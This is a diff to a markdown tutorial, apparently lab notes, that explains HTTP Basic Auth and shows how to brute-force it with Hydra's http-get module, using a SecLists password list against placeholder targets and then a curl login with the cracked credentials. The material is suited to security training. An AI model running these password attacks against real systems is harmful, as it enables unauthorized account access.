@@ -4,16 +4,18 @@
 
 ## How Basic Auth Works
 
-1. Browser requests a protected resource
-2. Server responds `401 Unauthorized` + `WWW-Authenticate` header
-3. Browser prompts for username/password
-4. Browser Base64-encodes `username:password` and sends it in every request:
+HTTP Basic Authentication (Basic Auth) is a simple login system built into the HTTP standard. Here is what happens step by step:
+
+1. Your browser requests a protected page
+2. The server replies with `401 Unauthorized` and a `WWW-Authenticate` header
+3. The browser shows a username/password prompt
+4. The browser Base64-encodes `username:password` and sends it with every request:
 
 ```
 Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 ```
 
-> Base64 is **not encryption** — it's trivially reversible. Basic Auth over HTTP (no TLS) exposes credentials in plaintext.
+> Base64 is **not encryption** — it is trivially reversible. Basic Auth over plain HTTP (no TLS/SSL) exposes your credentials in cleartext on the wire.
 
 ---
 
@@ -26,6 +28,7 @@ Use the `http-get` module. Point it at the protected path.
 ```bash
 hydra -l USERNAME -P WORDLIST TARGET http-get /PATH -s PORT -f
 ```
+> Generic template for attacking Basic Auth. Replace `USERNAME`, `WORDLIST`, `TARGET`, `/PATH`, and `PORT` with your target's values. `-f` stops Hydra after the first valid password is found.
 
 | Part | Purpose |
 |------|---------|
@@ -53,6 +56,7 @@ hydra -l USERNAME -P WORDLIST TARGET http-get /PATH -s PORT -f
 hydra -l basic-auth-user -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
   TARGET_IP http-get / -s TARGET_PORT -f
 ```
+> Attacks the root `/` path with a single known username and a 200-entry password list. Replace `basic-auth-user`, `TARGET_IP`, and `TARGET_PORT` with your target's values. `-f` stops after the first hit.
 
 **Output:**
 ```
@@ -69,8 +73,9 @@ Once you have the password, authenticate with curl using `-u user:pass`:
 ```bash
 curl -s -u basic-auth-user:Password@123 http://TARGET_IP:TARGET_PORT/
 ```
+> Retrieves the protected page after cracking. `-u user:pass` tells curl to send Basic Auth headers automatically. Replace the credentials and URL with your target's values.
 
-**Why `-u`:** curl's `-u` flag sends credentials as Basic Auth — same as the browser dialog. No need to manually Base64-encode.
+**Why `-u`:** curl's `-u` flag handles Basic Auth automatically — same as the browser login dialog. You don't need to Base64-encode the credentials yourself.
 
 **Result:**
 ```
